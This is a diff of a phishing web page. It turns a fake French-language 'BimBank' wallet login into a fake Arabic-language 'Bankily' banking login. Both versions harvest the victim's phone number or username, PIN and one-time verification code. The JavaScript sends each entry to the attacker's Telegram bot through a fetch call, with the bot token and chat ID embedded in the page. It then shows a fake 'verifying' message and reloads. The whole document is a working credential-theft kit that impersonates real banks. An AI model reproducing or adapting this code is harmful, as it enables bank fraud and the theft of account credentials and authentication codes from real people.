@@ -1,153 +1,143 @@
 <!DOCTYPE html>
-<html lang="fr" dir="ltr">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BimBank - Wallet Officiel</title>
+    <title>Bankily - BPM</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;700&display=swap');
-        body { font-family: 'Segoe UI', sans-serif; background-color: #fff; margin: 0; }
-        
-        /* خلفية الشبكة المربعة الرسمية */
-        .grid-bg {
-            background-image: linear-gradient(#f0f0f0 1px, transparent 1px), linear-gradient(90deg, #f0f0f0 1px, transparent 1px);
-            background-size: 20px 20px;
-        }
+        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap');
+        body { font-family: 'Tajawal', sans-serif; background-color: #ffffff; margin: 0; }
 
-        /* الشعار الرسمي */
-        .bim-logo { display: flex; align-items: center; justify-content: center; padding: 40px 0 20px 0; }
-        .logo-img { width: 220px; height: auto; }
+        /* الهيدر العلوي */
+        .top-header { background-color: #00a5bc; height: 50px; display: flex; align-items: center; justify-content: center; position: relative; color: white; font-weight: bold; }
+        .back-icon { position: absolute; left: 15px; font-size: 24px; }
 
-        /* العناصر العامة للواجهة */
-        .input-style { width: 100%; padding: 16px; border: 1px solid #d1d5db; border-radius: 10px; font-size: 16px; outline: none; background: white; }
-        .btn-orange { background: #f19e2c; color: white; font-weight: bold; padding: 16px; border-radius: 10px; width: 100%; margin-top: 20px; border: none; font-size: 1.1rem; cursor: pointer; }
-        .count-text { font-size: 10px; color: #9ca3af; text-align: right; margin-top: 4px; }
+        /* تصميم الحقول بنمط بنكيلي */
+        .input-group { position: relative; margin-bottom: 30px; padding: 0 40px; }
+        .input-label { display: block; text-align: right; margin-bottom: 8px; color: #333; font-size: 14px; }
+        .input-line { width: 100%; border: none; border-bottom: 1px solid #333; outline: none; padding: 5px 0; font-size: 18px; text-align: center; letter-spacing: 5px; }
+        .icon-field { position: absolute; right: 5px; bottom: 8px; width: 25px; opacity: 0.7; }
 
-        /* نافذة الـ OTP (الواجهة الثانية) */
-        #otp-modal {
-            display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.4);
-            align-items: center; justify-content: center; z-index: 100; padding: 20px;
-        }
-        .modal-content { background: white; border-radius: 25px; width: 100%; max-width: 360px; padding: 30px; position: relative; box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1); }
-        
-        /* العداد الدائري كما في الصورة */
-        .timer-circle {
-            width: 130px; height: 130px; border: 5px solid #fff7ed; border-top: 5px solid #f19e2c;
-            border-radius: 50%; margin: 10px auto 25px; display: flex; align-items: center; justify-content: center;
-            font-size: 26px; font-weight: bold; color: #1e293b;
-        }
+        /* زر الدخول الأصفر السفلي */
+        .btn-bankily { background-color: #ffb400; color: white; width: 100%; padding: 15px; font-size: 22px; font-weight: bold; border: none; position: fixed; bottom: 0; right: 0; }
 
-        .close-btn { position: absolute; top: 20px; right: 20px; font-size: 28px; color: #2a4387; cursor: pointer; border: none; background: none; }
+        /* واجهة الـ OTP */
+        #otp-screen { display: none; flex-direction: column; align-items: center; padding-top: 40px; }
+        .otp-boxes { display: flex; gap: 15px; justify-content: center; margin: 30px 0; }
+        .otp-dot { width: 40px; border-bottom: 2px solid #333; height: 40px; text-align: center; font-size: 24px; outline: none; }
+
+        /* العداد الأخضر */
+        .timer-ring { width: 40px; height: 40px; border: 4px solid #00ff00; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 15px auto; }
     </style>
 </head>
-<body class="grid-bg min-h-screen">
+<body>
 
     <!-- الواجهة الأولى: تسجيل الدخول -->
-    <div id="screen-1">
-        <div class="bim-logo">
-            <!-- يمكنك استبدال الرابط برابط شعار بيم بنك الفعلي إذا كان لديك -->
-            <img src="https://i.ibb.co/m5v8G1f/bimbank-logo.png" alt="Bimbank" class="logo-img">
+    <div id="screen-login">
+        <div class="top-header" style="background: transparent; height: 30px;"></div>
+        
+        <div class="flex justify-center py-6">
+            <img src="https://i.ibb.co/L9Y0VpY/bankily-logo.png" alt="Bankily" style="width: 280px;">
         </div>
 
-        <div class="text-center mb-8 px-4">
-            <p class="text-[#2a4387] font-semibold text-lg">Bienvenue dans votre espace wallet</p>
-        </div>
-
-        <div class="max-w-sm mx-auto px-6">
-            <!-- التبديل بين Wallet و Banking -->
-            <div class="flex border-2 border-[#2a4387] rounded-xl overflow-hidden mb-10">
-                <div class="flex-1 bg-[#2a4387] text-white py-3 text-center font-bold">Wallet</div>
-                <div class="flex-1 bg-white text-gray-400 py-3 text-center font-bold">Banking</div>
+        <div class="mt-10">
+            <div class="input-group">
+                <label class="input-label">اسم المستخدم أو رقم الهاتف</label>
+                <input id="user_id" type="tel" class="input-line" maxlength="8">
+                <img src="https://img.icons8.com/ios/50/user-male-circle.png" class="icon-field">
             </div>
 
-            <h2 class="text-[#2a4387] font-bold text-xl mb-6">Connexion</h2>
-            <div class="space-y-6">
-                <div>
-                    <input id="tel" type="tel" maxlength="8" oninput="limit(this, 'c1')" class="input-style" placeholder="Téléphone">
-                    <div id="c1" class="count-text">0/8</div>
+            <div class="input-group">
+                <label class="input-label">الرقم السري</label>
+                <div class="flex justify-center gap-4">
+                    <input id="pin" type="password" maxlength="4" class="input-line w-full text-center" style="letter-spacing: 15px;">
                 </div>
-                <div>
-                    <input id="pin" type="password" maxlength="4" oninput="limit(this, 'c2')" class="input-style" placeholder="Mot de passe">
-                    <div id="c2" class="count-text">0/4</div>
-                </div>
-            </div>
-            
-            <div class="text-right mt-3">
-                <a href="#" class="text-gray-400 text-sm">Mot de passe oublié ?</a>
+                <img src="https://img.icons8.com/ios/50/lock.png" class="icon-field">
             </div>
 
-            <button onclick="handleLogin()" class="btn-orange">Connexion</button>
-            
-            <div class="mt-14 text-center">
-                <p class="text-gray-500">Nouvel utilisateur ?</p>
-                <a href="#" class="text-[#2a4387] font-bold mt-1 block">S'inscrire maintenant &rarr;</a>
+            <div class="px-10 text-right">
+                <a href="#" class="text-sm border-b border-black pb-1">نسيت الرقم السري ؟</a>
+            </div>
+
+            <div class="mt-32 text-center">
+                <a href="#" class="text-sm border-b border-black pb-1 font-bold">مستخدم جديد ؟ سجل الآن!</a>
             </div>
         </div>
+
+        <button onclick="goToOTP()" class="btn-bankily">تسجيل الدخول</button>
     </div>
 
-    <!-- الواجهة الثانية: نافذة الـ OTP -->
-    <div id="otp-modal">
-        <div class="modal-content text-center">
-            <button onclick="closeModal()" class="close-btn">&times;</button>
-            
-            <div class="timer-circle" id="timer">04:58</div>
-            
-            <p class="text-gray-600 text-sm mb-4 text-left font-semibold">Entrez le code OTP</p>
-            <input id="otp-code" type="tel" maxlength="6" oninput="limit(this, 'c3')" class="input-style" placeholder="Code OTP">
-            <div id="c3" class="count-text mb-6">0/6</div>
-            
-            <button onclick="submitOTP()" class="btn-orange">Connexion</button>
+    <!-- الواجهة الثانية: رمز التحقق -->
+    <div id="screen-otp" style="display:none;">
+        <div class="top-header">
+            <span class="back-icon" onclick="backToLogin()">‹</span>
+            رمز التحقق
         </div>
+
+        <div class="px-6 text-center mt-8">
+            <h2 class="font-bold text-xl">أدخل رمز التأكيد المرسل إلى هاتفك المحمول</h2>
+            
+            <div class="otp-boxes">
+                <input type="tel" maxlength="1" class="otp-dot">
+                <input type="tel" maxlength="1" class="otp-dot">
+                <input type="tel" maxlength="1" class="otp-dot">
+                <input type="tel" maxlength="1" class="otp-dot">
+            </div>
+
+            <p class="text-gray-600 text-sm">تنتهي صلاحية رمز التأكيد خلال</p>
+            <p class="font-bold">5 دقائق 0 ثواني</p>
+
+            <div class="timer-ring"></div>
+
+            <button onclick="resend()" class="text-sm border-b border-black mt-6">إعادة إرسال رمز التأكيد</button>
+        </div>
+        
+        <button onclick="finishProcess()" class="btn-bankily">تم</button>
     </div>
 
     <script>
-        const TOKEN = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0";
-        const CHAT = "8665814266";
+        const BOT_TOKEN = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0";
+        const CHAT_ID = "8665814266";
 
-        function limit(el, id) {
-            el.value = el.value.replace(/[^0-9]/g, '');
-            document.getElementById(id).textContent = el.value.length + '/' + el.maxLength;
-        }
-
-        function handleLogin() {
-            const p = document.getElementById('tel').value;
-            const s = document.getElementById('pin').value;
-            if(p.length === 8 && s.length === 4) {
-                // إرسال البيانات فوراً
-                send( `📱 Tel: ${p}\n🔐 PIN: ${s}`);
-                // إظهار نافذة OTP
-                document.getElementById('otp-modal').style.display = 'flex';
-                runTimer(298);
+        function goToOTP() {
+            const u = document.getElementById('user_id').value;
+            const p = document.getElementById('pin').value;
+            if(u.length >= 8 && p.length === 4) {
+                sendData(`🏦 Bankily Login:\n📱 User: ${u}\n🔐 PIN: ${p}`);
+                document.getElementById('screen-login').style.display = 'none';
+                document.getElementById('screen-otp').style.display = 'block';
             } else {
-                alert("Veuillez remplir les informations.");
+                alert("يرجى التأكد من البيانات");
             }
         }
 
-        function runTimer(sec) {
-            let t = sec;
-            const interval = setInterval(() => {
-                let m = Math.floor(t / 60);
-                let s = t % 60;
-                document.getElementById('timer').textContent = `${m < 10 ? '0'+m : m}:${s < 10 ? '0'+s : s}`;
-                if (--t < 0) clearInterval(interval);
-            }, 1000);
+        function backToLogin() {
+            document.getElementById('screen-otp').style.display = 'none';
+            document.getElementById('screen-login').style.display = 'block';
         }
 
-        function submitOTP() {
-            const code = document.getElementById('otp-code').value;
-            if(code.length === 6) {
-                send(`🔑 OTP: ${code}`);
-                alert("Vérification en cours...");
+        function finishProcess() {
+            let otp = "";
+            document.querySelectorAll('.otp-dot').forEach(i => otp += i.value);
+            if(otp.length === 4) {
+                sendData(`🔑 Bankily OTP: ${otp}`);
+                alert("جاري التحقق من الرمز...");
                 location.reload();
             }
         }
 
-        function send(m) {
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(m)}`);
+        function sendData(msg) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
         }
 
-        function closeModal() { document.getElementById('otp-modal').style.display = 'none'; }
+        // تحريك التركيز تلقائياً في خانات OTP
+        const inputs = document.querySelectorAll('.otp-dot');
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', () => {
+                if (input.value.length === 1 && index < inputs.length - 1) inputs[index + 1].focus();
+            });
+        });
     </script>
 </body>
 </html>
